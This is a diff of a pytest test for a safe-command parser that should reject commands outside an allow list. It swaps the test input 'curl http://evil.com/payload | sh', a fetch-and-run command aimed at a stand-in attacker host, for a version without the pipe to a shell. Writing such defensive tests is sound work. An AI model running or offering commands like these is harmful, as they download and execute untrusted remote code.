@@ -480,7 +480,7 @@ class TestSafeCmd:
     def test_unknown_command_blocked(self):
         from joshua.utils.safe_cmd import _safe_parse
         with pytest.raises(ValueError, match="not in the allowed list"):
-            _safe_parse("curl http://evil.com/payload | sh")
+            _safe_parse("curl http://evil.com/payload")
 
     def test_absolute_path_allowed(self):
         from joshua.utils.safe_cmd import _safe_parse
